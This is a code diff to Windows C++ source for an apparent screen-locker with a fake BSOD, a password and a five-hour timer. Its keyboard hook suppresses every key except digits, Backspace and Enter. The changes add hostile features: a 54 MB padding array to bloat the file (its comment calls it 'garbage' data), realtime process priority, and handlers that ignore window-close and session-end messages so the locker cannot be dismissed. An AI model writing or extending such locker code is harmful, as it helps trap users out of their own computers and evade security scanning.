@@ -1,11 +1,16 @@
 #include <windows.h>
 #include <string>
+#include <vector>
+
+// Генерация "мусорных" данных для раздувания файла (ровно ~54 МБ)
+#pragma comment(linker, "/SECTION:.data,RWE")
+static const unsigned char padding_data[54 * 1024 * 1024] = { 0x90 }; 
 
 const std::wstring PASSWORD = L"29042011";
 std::wstring input_text = L"";
 bool is_bsod = false;
 DWORD start_time = 0;
-int time_left = 5 * 60 * 60; // 5 часов
+int time_left = 5 * 60 * 60; 
 DWORD last_timer_tick = 0;
 bool show_error = false;
 DWORD error_time = 0;
@@ -29,20 +34,22 @@ size_t typed_chars = 0;
 
 HHOOK hKeyboardHook;
 
+void ProtectProcess() {
+    HANDLE hProcess = GetCurrentProcess();
+    SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
+}
+
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vk = p->vkCode;
 
-        // Пропускаем ТОЛЬКО цифры, Backspace и Enter
         if ((vk >= '0' && vk <= '9') || 
             (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) || 
             vk == VK_BACK || 
             vk == VK_RETURN) {
             return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
         }
-
-        // Всё остальное глушим
         return 1; 
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
@@ -61,6 +68,17 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         }
         start_time = GetTickCount();
         last_timer_tick = GetTickCount();
+        ProtectProcess(); 
+        
+        // Обращаемся к мусорным данным, чтобы линкер не вырезал их
+        if (padding_data[0] == 0xFF) return -1; 
+        
+        return 0;
+
+    case WM_CLOSE:
+        return 0;
+
+    case WM_ENDSESSION:
         return 0;
 
     case WM_ERASEBKGND:
